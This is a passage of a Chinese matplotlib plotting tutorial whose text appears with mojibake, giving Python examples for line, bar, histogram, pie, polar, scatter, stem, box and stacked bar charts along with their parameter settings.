&lt;p&gt;è¿™æ ·å°±å¤§åŠŸå‘Šæˆäº†ï¼Œæœ€åå†æ¥çœ‹ä¸€ä¸‹ç°å®çš„å›¾å½¢&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1600796346205-12eb4d1e-6b38-44b1-a332-e8e5ca35dc14.png#align=left&amp;amp;display=inline&amp;amp;height=444&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=888&amp;amp;originWidth=1436&amp;amp;size=85762&amp;amp;status=done&amp;amp;style=none&amp;amp;width=718&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;æœ€ååœ¨ç”»å›¾æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨labelå‚æ•°ç»™å›¾ç‰‡æ·»åŠ ä¸€ä¸ªå›¾ä¾‹è¯´æ˜ï¼Œæœ€åä½¿ç”¨legendæ˜¾ç¤ºå‡ºæ¥ï¼Œæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt

# np.linspaceå°†ä¼šåœ¨-5åˆ°5çš„åŒºé—´å†…ç”Ÿæˆ100ä¸ªæ•°ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯å‡åŒ€åˆ†å¸ƒçš„
x = np.linspace(-5, 5, 100)

# æ ¹æ®xçš„å€¼ï¼Œç»è¿‡è®¡ç®—ç”Ÿæˆy1å’Œy2çš„å€¼
y1 = 2 * x + 1
y2 = x ** 2

# font = {&quot;family&quot; : &quot;SimHei&quot;,
#  &quot;size&quot; : &quot;20&quot;}
# plt.rc(&quot;font&quot;, **font)
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# è®¾ç½®ç”»å¸ƒå¤§å°
plt.figure(figsize=(8, 5))

# ç”»å›¾
plt.plot(x, y1, label='y1å›¾ä¾‹è¯´æ˜')
plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--', label='y2å›¾ä¾‹è¯´æ˜')

# è®¾ç½®åæ ‡è½´èŒƒå›´
plt.xlim((-3, 5))
plt.ylim((-4, 5))

# è®¾ç½®åæ ‡è½´åç§°
plt.xlabel('æˆ‘æ˜¯xè½´')
plt.ylabel('æˆ‘æ˜¯yè½´')

# è®¾ç½®åæ ‡è½´çš„åˆ»åº¦
plt.xticks(np.linspace(-1, 2, 5))
plt.yticks([-2, -1.8, -1, 1.22, 3], [&quot;åŒ—äº¬&quot;, &quot;å¤©æ´¥&quot;, &quot;æ²³åŒ—&quot;, &quot;ä¸œåŒ—&quot;, &quot;å±±ä¸œ&quot;])

# æ·»åŠ è¾¹æ¡†
ax = plt.gca()
# ä¿®æ”¹å³ä¾§é¢œè‰²
ax.spines[&quot;right&quot;].set_color(&quot;none&quot;)
# ä¿®æ”¹å·¦ä¾§é¢œè‰²
ax.spines[&quot;left&quot;].set_color(&quot;orange&quot;)
# ä¿®æ”¹é¡¶éƒ¨é¢œè‰²
ax.spines[&quot;top&quot;].set_color(&quot;none&quot;)
# ä¿®æ”¹åº•éƒ¨é¢œè‰²
ax.spines[&quot;bottom&quot;].set_color(&quot;purple&quot;)

# è®¾ç½®xè½´çš„ä½ç½®
ax.xaxis.set_ticks_position(&quot;bottom&quot;)
ax.spines[&quot;bottom&quot;].set_position((&quot;data&quot;, 0))
# è®¾ç½®yè½´çš„ä½ç½®
ax.yaxis.set_ticks_position(&quot;left&quot;)
ax.spines[&quot;left&quot;].set_position((&quot;data&quot;, 0))

# fontdict æ˜¯å¯¹å­—ä½“å¤§å°å’Œé¢œè‰²è¿›è¡Œè®¾ç½®ï¼Œå¦‚æœè¿™é‡Œä¼šå¯¹åŸå›¾æœ‰é®æŒ¡ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°è®¾ç½®ç”»å¸ƒå¤§å°
plt.text(1, -1, &quot;è¿™æ˜¯æˆ‘å¯¹å›¾ç‰‡æ·»åŠ çš„ä¸€æ®µè¯´æ˜&quot;, fontdict={&quot;size&quot;: 12, &quot;color&quot;: &quot;r&quot;})

# æ˜¾ç¤º
plt.legend(loc='lower right')  # å›¾ä¾‹è¯´æ˜æ²¡æœ‰å‚æ•°åˆ™é»˜è®¤åœ¨å³ä¸Šè§’
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;äºŒ-ç»˜åˆ¶ç»Ÿè®¡å›¾å½¢&quot;&gt;äºŒ ç»˜åˆ¶ç»Ÿè®¡å›¾å½¢&lt;/h3&gt;
&lt;h4 id=&quot;1-æŸ±çŠ¶å›¾&quot;&gt;1 æŸ±çŠ¶å›¾&lt;/h4&gt;
&lt;p&gt;åœ¨å®é™…çš„ä¼ä¸šåº”ç”¨ä¸­ï¼Œæˆ‘ä»¬è¦æŒæ¡å¤šç§å›¾å½¢çš„ç»˜åˆ¶ï¼Œå¹¶ä¸”æ·±åº¦ç»“åˆè‡ªå·±çš„åº”ç”¨åœºæ™¯ï¼Œç”¨åˆé€‚çš„å›¾å½¢æ¥å±•ç¤ºé€‚åˆå®ƒçš„æ•°æ®åœºæ™¯ï¼Œä½¿å¾—æ•°æ®æ›´å…·æœ‰è¯´æ˜åŠ›ã€‚&lt;/p&gt;&lt;p&gt;é¦–å…ˆæˆ‘ä»¬æ¥å­¦ä¹ ä¸€ä¸‹bar()å‡½æ•°ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯åœ¨xè½´ä¸Šç»˜åˆ¶å®šæ€§æ•°æ®çš„åˆ†å¸ƒç‰¹å¾ï¼Œä¹Ÿå°±æ˜¯æŸ±çŠ¶å›¾ã€‚ä½¿ç”¨æ–¹æ³•æ˜¯plt.bar(x,y)ï¼Œå…¶ä¸­xè¡¨ç¤ºåœ¨xè½´ä¸Šçš„å®šæ€§æ•°æ®çš„ç±»åˆ«ï¼Œè€Œyè¡¨ç¤ºæ¯ç§å®šæ€§æ•°æ®çš„ç±»åˆ«çš„æ•°é‡ã€‚å¦‚æœä½ è§‰å¾—æœ‰ç‚¹æŠ½è±¡ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥ä¸Šä»£ç å§ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

# xæ˜¯åˆ»åº¦ï¼Œyæ˜¯é«˜åº¦
x = [1, 2, 3, 4, 5, 6, 7, 8]
y = [3, 1, 4, 5, 7, 8, 6, 4]

plt.bar(x, y)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ä»£ç éå¸¸ç®€å•ï¼Œåˆ†åˆ«å®šä¹‰å¥½äº†xå’Œyå¹¶ä¸”å¸¦å…¥å‡½æ•°é‡Œé¢å°±å¯ä»¥äº†ï¼Œå®ƒçš„ç°å®ç»“æœå…¶å®å°±æ˜¯ä¸€ä¸ªæ¡å½¢å›¾ã€‚&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601013958480-f095a7e1-bbed-4b5a-a074-e868716494ab.png#align=left&amp;amp;display=inline&amp;amp;height=442&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=884&amp;amp;originWidth=1126&amp;amp;size=93930&amp;amp;status=done&amp;amp;style=none&amp;amp;width=563&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;2-é¢‘ç‡åˆ†å¸ƒç›´æ–¹å›¾&quot;&gt;2 é¢‘ç‡åˆ†å¸ƒç›´æ–¹å›¾&lt;/h4&gt;
&lt;p&gt;ä¸æ¡å½¢å›¾ç›¸å¯¹æ¯”çš„æ˜¯é¢‘ç‡ç›´æ–¹å›¾ï¼ˆfrequency histogramï¼‰ï¼Œä¹Ÿå«åšé¢‘ç‡åˆ†å¸ƒç›´æ–¹å›¾ï¼Œæ˜¯ç»Ÿè®¡å­¦ä¸­è¡¨ç¤ºé¢‘ç‡åˆ†å¸ƒçš„å›¾å½¢ã€‚åœ¨ç›´è§’åæ ‡ç³»ä¸­ï¼Œç”¨æ¨ªè½´è¡¨ç¤ºéšæœºå˜é‡çš„å–å€¼ï¼Œæ¨ªè½´ä¸Šçš„æ¯ä¸ªå°åŒºé—´å¯¹åº”ä¸€ä¸ªç»„çš„ç»„è·ï¼Œä½œä¸ºå°çŸ©å½¢çš„åº•è¾¹ï¼›çºµè½´è¡¨ç¤ºé¢‘ç‡(é¢‘æ•°/ç»„è·=é¢‘ç‡)ï¼Œå¹¶ç”¨å®ƒä½œå°çŸ©å½¢çš„é«˜ï¼Œä»¥è¿™ç§å°çŸ©å½¢æ„æˆçš„ä¸€ç»„å›¾ç§°ä¸ºé¢‘ç‡ç›´æ–¹å›¾ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

x = np.random.randint(0, 10, 20)
print(x)

plt.hist(x)
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;éšæœºxè¾“å‡ºç»“æœï¼š[9 7 4 1 0 9 8 3 7 8 1 1 7 4 6 8 0 6 9 9]&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601014242791-58340cca-3701-4407-ac41-31d7013ec1f9.png#align=left&amp;amp;display=inline&amp;amp;height=437&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=874&amp;amp;originWidth=1154&amp;amp;size=84380&amp;amp;status=done&amp;amp;style=none&amp;amp;width=577&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;3-é¥¼å›¾&quot;&gt;3 é¥¼å›¾&lt;/h4&gt;
&lt;p&gt;ä¸‹é¢è¦å­¦ä¹ çš„å°±æ˜¯é¥¼å›¾ï¼Œé¥¼å›¾æ˜¯ä¸€ç§ç”¨æ¥è¡¨ç¤ºæ•°æ®æ‰€å æ¯”ä¾‹æœ€å¸¸ç”¨çš„å›¾å½¢ï¼Œå®ƒçš„å‡½æ•°æ˜¯pie()ï¼Œä½¿ç”¨æ–¹æ³•ä¹Ÿéå¸¸çš„ç®€å•ï¼Œæˆ‘ä»¬è¿›è¡Œæœ€ç®€å•çš„å›¾å½¢è°ƒç”¨çš„æ—¶å€™ä¹Ÿå¯ä»¥åªä¼ ä¸€ä¸ªå‚æ•°ï¼Œå°±åƒè¿™æ ·plt.pie(x)ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# å£°æ˜ç±»åˆ«
kinds = ['è‹¹æœ', 'é¦™è•‰', 'è¥¿çº¢æŸ¿', 'è¥¿ç“œ']

# è¿™ä¸ªæ˜¯16è¿›åˆ¶é¢œè‰²ç ï¼Œä½ å¯ä»¥åœ¨ç½‘ä¸Šæœç´¢16è¿›åˆ¶é¢œè‰²ç å°±å¯ä»¥è·å–åˆ°æ‰€æœ‰çš„ç¼–ç 
colors = ['#e41a1c', '#DDA0DD', '#4B0082', '#7FFFAA']

sold_nums = [4, 3, 2, 5]

# ç»˜åˆ¶é¥¼å›¾,æ ¹æ®å›¾å½¢æ•ˆæœï¼Œçœ‹ä¸€ä¸‹è¿™äº›å‚æ•°çš„å«ä¹‰å§
plt.pie(sold_nums,
        labels=kinds,
        colors=colors)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;é¥¼å›¾æ˜¾ç¤ºç»“æœ&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601014498855-76923409-2339-4dc0-b024-ca9ece625f03.png#align=left&amp;amp;display=inline&amp;amp;height=375&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=750&amp;amp;originWidth=1078&amp;amp;size=96562&amp;amp;status=done&amp;amp;style=none&amp;amp;width=539&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;4-æçº¿å›¾&quot;&gt;4 æçº¿å›¾&lt;/h4&gt;
&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹æçº¿å›¾çš„ç»˜åˆ¶æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨plt.polar(theta,x)è¿™æ ·çš„æ–¹å¼æ¥è¿›è¡Œå›¾å½¢çš„ç»˜åˆ¶ï¼Œå¦‚æœä½ ä¹‹å‰æ²¡æ¥è§¦è¿‡è¿™ç§å›¾å½¢ï¼Œè§£é‡Šèµ·æ¥æœ‰ä¸€ç‚¹å¤æ‚ï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹ä¸€ä¸‹æ•ˆæœå§ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

bar_slices = 10  # æ˜Ÿæ˜Ÿæ•°é‡
theta = np.linspace(0.0, 2*np.pi, bar_slices, endpoint=False)
r = 30*np.random.rand(bar_slices)
print(r)

# linewidthä¸ºçº¿æ¡ç²—ç»†ï¼Œmfcä¸ºæ˜Ÿæ˜Ÿé¢œè‰²ï¼Œmsä¸ºæ˜Ÿæ˜Ÿå¤§å°
plt.polar(theta, r, color='chartreuse', linewidth=2, marker='*', mfc='y', ms=10)
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;rè¾“å‡ºç»“æœä¸ºï¼š[19.19557439 Â 9.80163298 14.72266501 25.96471826 17.43950265 27.16974937&lt;br/&gt;24.16166493 Â 8.32586511 Â 1.07374567 21.5498875 ]&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601015666302-59cc102b-829f-4c14-ae2b-1e452fc0b8c2.png#align=left&amp;amp;display=inline&amp;amp;height=459&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=918&amp;amp;originWidth=1122&amp;amp;size=151877&amp;amp;status=done&amp;amp;style=none&amp;amp;width=561&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;5-æ•£ç‚¹å›¾&quot;&gt;5 æ•£ç‚¹å›¾&lt;/h4&gt;
&lt;p&gt;æ¥ä¸‹æ¥è¦å­¦ä¹ çš„å›¾å½¢å«åšæ•£ç‚¹å›¾ï¼Œä¹Ÿæœ‰å«åšæ°”æ³¡å›¾çš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨plt.scatter(x,y)è¿™æ ·çš„æ–¹å¼æ¥è¿›è¡Œå›¾å½¢çš„ç»˜åˆ¶ã€‚å…³äºscatterçš„å‚æ•°ï¼š&lt;br/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;xå°±è¡¨ç¤ºxè½´ä¸Šçš„å€¼&lt;/li&gt;
&lt;li&gt;yå°±è¡¨ç¤ºyè½´ä¸Šçš„å€¼&lt;/li&gt;
&lt;li&gt;sè¡¨ç¤ºæ•£ç‚¹æ ‡è®°çš„å¤§å°ï¼Œè¿™ä¸ªæ˜¯å¯é€‰é¡¹&lt;/li&gt;
&lt;li&gt;cè¡¨ç¤ºæ•£ç‚¹æ ‡è®°çš„é¢œè‰²ï¼Œå¯é€‰é¡¹&lt;/li&gt;
&lt;li&gt;cmapè¡¨ç¤ºå°†æµ®ç‚¹æ•°æ˜ å°„æˆé¢œè‰²çš„é¢œè‰²æ˜ å°„è¡¨&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;br/&gt;è®©æˆ‘ä»¬é€šè¿‡ä¸€æ®µä»£ç çš„æ¼”ç¤ºï¼Œæ¥çœ‹çœ‹å®è·µä¸€ä¸‹è¿™äº›å‚æ•°ã€‚è‡ªå·±å¯ä»¥æ ¹æ®æˆ‘çš„è¯´æ˜å°è¯•ç€ä¿®æ”¹ä¸€ä¸‹è¿™äº›å‚æ•°ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np
import matplotlib as mpl

a = np.random.randn(100)
b = np.random.randn(100)

&quot;&quot;&quot;
cmapçš„å‚æ•°éå¸¸å¤šï¼Œcmåé¢çš„gist_rainbowå¯ä»¥æœ‰å¾ˆå¤šæ›¿ä»£
å…·ä½“çš„å¯ä»¥åœ¨å®˜ç½‘æˆ–è€…æºä»£ç ä¸­æŸ¥è¯¢ä½¿ç”¨ï¼Œä¸è¿‡éƒ½æŠŠå·®åˆ«ä¸å¤§ï¼Œå°±æ˜¯é¢œè‰²ä¸Šçš„åŒºåˆ«
&quot;&quot;&quot;
plt.scatter(a, b, s=np.power(10*a+20*b, 2),
            c=np.random.rand(100),
            cmap=mpl.cm.gist_rainbow,
            marker='o')  # markerè¡¨ç¤ºæ•£ç‚¹çš„æ ·å¼ï¼Œå¯ä»¥è¯•è¯•ç”¨o,*æˆ–è€…^

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å±•ç¤ºç»“æœå¦‚å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601018493431-d321585c-fe39-405b-a03d-a72d504e7d23.png#align=left&amp;amp;display=inline&amp;amp;height=439&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=878&amp;amp;originWidth=1150&amp;amp;size=190222&amp;amp;status=done&amp;amp;style=none&amp;amp;width=575&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;6-æ£‰æ£’å›¾&quot;&gt;6 æ£‰æ£’å›¾&lt;/h4&gt;
&lt;p&gt;ä¸‹é¢æˆ‘ä»¬æ¥è®²è§£ä¸€ä¸‹æ£‰æ£’å›¾çš„ç»˜åˆ¶æ–¹æ³•ï¼Œæ£‰æ£’å›¾ä¸»è¦ç”¨æ¥ç»˜åˆ¶ç¦»æ•£æœ‰åºçš„æ•°æ®ï¼Œä½¿ç”¨æ–¹æ³•æ˜¯plt.stem(x,y)ã€‚å…³äºå®ƒçš„å‚æ•°æœ‰ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;x:ç”¨æ¥æŒ‡å®šæ£‰æ£’çš„xè½´åŸºçº¿ä¸Šçš„ä½ç½®ã€‚&lt;/li&gt;
&lt;li&gt;y:æ£‰æ£’çš„é•¿åº¦ã€‚&lt;/li&gt;
&lt;li&gt;linefmt:æ£‰æ£’çš„æ ·å¼ã€‚&lt;/li&gt;
&lt;li&gt;markerfmt:æ£‰æ£’æœ«ç«¯çš„æ ·å¼ã€‚&lt;/li&gt;
&lt;li&gt;basefmt:æŒ‡å®šåŸºçº¿çš„æ ·å¼ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;æˆ‘ä»¬ç›´æ¥ä¸Šä»£ç æ¥çœ‹ä¸€ä¸‹&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# linspaceï¼šåœ¨0.5å’Œ2*np.piä¹‹é—´è¿”å›20ä¸ªå‡åŒ€é—´éš”çš„æ•°æ®
x = np.linspace(0.5, 2 * np.pi, 20)
# randnï¼šè¿”å›20ä¸ªæœä»æ ‡å‡†æ­£æ€åˆ†å¸ƒçš„æ ·æœ¬æ•°æ®
y = np.random.randn(20)

# --æ˜¯è™šçº¿ï¼Œ-æ˜¯å®çº¿
plt.stem(x, y, linefmt='--', markerfmt='o', basefmt='-')
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601237464942-a3b5ed7b-e8c3-4410-bdc0-7406805415e2.png#align=left&amp;amp;display=inline&amp;amp;height=438&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=876&amp;amp;originWidth=1142&amp;amp;size=77952&amp;amp;status=done&amp;amp;style=none&amp;amp;width=571&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;7-ç®±çº¿å›¾&quot;&gt;7 ç®±çº¿å›¾&lt;/h4&gt;
&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬æ¥ç»˜åˆ¶ä¸€ä¸‹ç®±çº¿å›¾ï¼Œç®±çº¿å›¾çš„ç»˜åˆ¶æ–¹æ³•ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬ä½¿ç”¨plt.boxplot(x)æ¥å®ç°ï¼Œxå°±æ˜¯æˆ‘ä»¬è¦è¾“å…¥çš„æ•°æ®äº†ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

x = np.random.randn(1000)
plt.boxplot(x)
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601237656858-449654fe-8454-45fa-af0b-7e219ed6bab5.png#align=left&amp;amp;display=inline&amp;amp;height=422&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=844&amp;amp;originWidth=1124&amp;amp;size=37558&amp;amp;status=done&amp;amp;style=none&amp;amp;width=562&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;ä¸‰-å›¾å½¢å‚æ•°è¯´æ˜&quot;&gt;ä¸‰ å›¾å½¢å‚æ•°è¯´æ˜&lt;/h3&gt;
&lt;h4 id=&quot;1-æŸ±çŠ¶å›¾å‚æ•°è¯¦è§£&quot;&gt;1 æŸ±çŠ¶å›¾å‚æ•°è¯¦è§£&lt;/h4&gt;
&lt;p&gt;æˆ‘ä»¬å†æ¬¡æ¥çœ‹ä¸€ä¸‹æŸ±çŠ¶å›¾ï¼ŒæŸ±çŠ¶å›¾åœ¨æ•°æ®çš„å¯è§†åŒ–å±•ç¤ºç”¨åº”ç”¨çš„åœºæ™¯éå¸¸çš„å¤šäº†ï¼Œæ¯”å¦‚æŒ‰ç…§æœˆä»½çš„å•†å“é”€é‡å±•ç¤ºï¼Œé”€å”®äººå‘˜çš„ä¸šç»©ç»Ÿè®¡ç­‰ç­‰åœºæ™¯æˆ‘ä»¬éƒ½ä¼šç”¨åˆ°ã€‚ç°åœ¨æˆ‘åœ¨åŸæœ‰ä»£ç åŸºç¡€ä¹‹ä¸ŠåŠ å…¥ä¸€äº›æ–°çš„å‚æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

x = [1, 2, 3, 4, 5]
y = [6, 10, 4, 5, 1]

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

plt.bar(
    # 1 æŸ±ä½“çš„æ ‡ç­¾å€¼
    x,
    # 2 æŸ±ä½“çš„é«˜åº¦
    y,
    # 3 æŸ±ä½“çš„å¯¹é½æ–¹å¼ï¼Œä¸¤ä¸ªå‚æ•°ï¼šedgeæˆ–è€…center
    align='edge',
    # 4 é¢œè‰²
    color='b',
    # 5 åˆ»åº¦çš„æ ‡ç­¾å€¼ï¼Œç”¨å­—æ¯æŠŠxä¸­çš„æ•°å­—æ›¿æ¢
    tick_label=['A', 'B', 'C', 'D', 'E'],
    # 6 é€æ˜åº¦
    alpha=0.5
)

plt.xlabel('äº§å“ä»£å·')
plt.ylabel('äº§å“é”€é‡')

# ç½‘æ ¼è®¾ç½®
plt.grid(
    True,
    # 1 axisæŒ‡çš„æ˜¯å¯¹è½´çš„è®¾ç½®ï¼Œå‚æ•°å¯ä»¥ä¸ºxï¼Œyæˆ–è€…both
    axis='x',
    # 2 lsæŒ‡çš„æ˜¯ç½‘æ ¼çš„æ ·å¼ï¼Œä¹Ÿå¯ä»¥å†™æˆ--æˆ–è€…:
    ls=':',
    color='r',
    alpha=0.9
)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601239204401-7bfbba14-06d2-4a4e-a085-02c844ff1841.png#align=left&amp;amp;display=inline&amp;amp;height=451&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=902&amp;amp;originWidth=1164&amp;amp;size=136551&amp;amp;status=done&amp;amp;style=none&amp;amp;width=582&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;2-æ¡å½¢å›¾å‚æ•°è¯¦è§£&quot;&gt;2 æ¡å½¢å›¾å‚æ•°è¯¦è§£&lt;/h4&gt;
&lt;p&gt;æ¡å½¢å›¾å…¶å®å°±æ˜¯æŠŠæŸ±çŠ¶å›¾æ¨ªè¿‡æ¥æ”¾ï¼Œå®ƒä»¬çš„ä½¿ç”¨æ–¹æ³•ä¸€æ ·ï¼Œåªæ˜¯è°ƒç”¨çš„å‡½æ•°ä¸åŒï¼Œå‚æ•°å…¨éƒ¨ç›¸åŒï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

x = [1, 2, 3, 4, 5]
y = [6, 10, 4, 5, 1]

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# å‡½æ•°æ”¹ä¸ºäº†barhï¼Œåªæ˜¯æ·»åŠ äº†ä¸€ä¸ªhï¼Œä»£è¡¨horizontalæ°´å¹³æ¨ªæ”¾
plt.barh(
    # 1 æŸ±ä½“çš„æ ‡ç­¾å€¼
    x,
    # 2 æŸ±ä½“çš„é«˜åº¦
    y,
    # 3 æŸ±ä½“çš„å¯¹é½æ–¹å¼ï¼Œä¸¤ä¸ªå‚æ•°ï¼šedgeæˆ–è€…center
    align='edge',
    # 4 é¢œè‰²
    color='b',
    # 5 åˆ»åº¦çš„æ ‡ç­¾å€¼ï¼Œç”¨å­—æ¯æŠŠxä¸­çš„æ•°å­—æ›¿æ¢
    tick_label=['A', 'B', 'C', 'D', 'E'],
    # 6 é€æ˜åº¦
    alpha=0.5
)

plt.xlabel('äº§å“ä»£å·')
plt.ylabel('äº§å“é”€é‡')

# ç½‘æ ¼è®¾ç½®
plt.grid(
    True,
    # 1 axisæŒ‡çš„æ˜¯å¯¹è½´çš„è®¾ç½®ï¼Œå‚æ•°å¯ä»¥ä¸ºxï¼Œyæˆ–è€…both
    axis='x',
    # 2 lsæŒ‡çš„æ˜¯ç½‘æ ¼çš„æ ·å¼ï¼Œä¹Ÿå¯ä»¥å†™æˆ--æˆ–è€…:
    ls=':',
    color='r',
    alpha=0.9
)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601239484351-8a4d066b-8f52-47a4-bda9-cbcfa8eae748.png#align=left&amp;amp;display=inline&amp;amp;height=451&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=902&amp;amp;originWidth=1166&amp;amp;size=111098&amp;amp;status=done&amp;amp;style=none&amp;amp;width=583&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;3-å †ç§¯å›¾å‚æ•°è¯¦è§£&quot;&gt;3 å †ç§¯å›¾å‚æ•°è¯¦è§£&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

x = [1, 2, 3, 4, 5]
y = [6, 10, 4, 5, 1]
y1 = [2, 6, 3, 4, 5]

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

plt.figure(figsize=(8, 5))
plt.bar(
    x,
    y,
    align='center',
    color='#66c2a5',
    tick_label=['A', 'B', 'C', 'D', 'E'],
    label='ç”·äºº'
)
plt.bar(
    x,
    y1,
    align='center',
    bottom=y,  # æŒ‡å®šå“ªä¸€å€¼åœ¨ä¸‹é¢
    color='#8da0cb',
    label='å¥³äºº'
)
plt.xlabel('åŸå¸‚ä»£å·')
plt.ylabel('ç”·å¥³æ¯”ä¾‹')

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
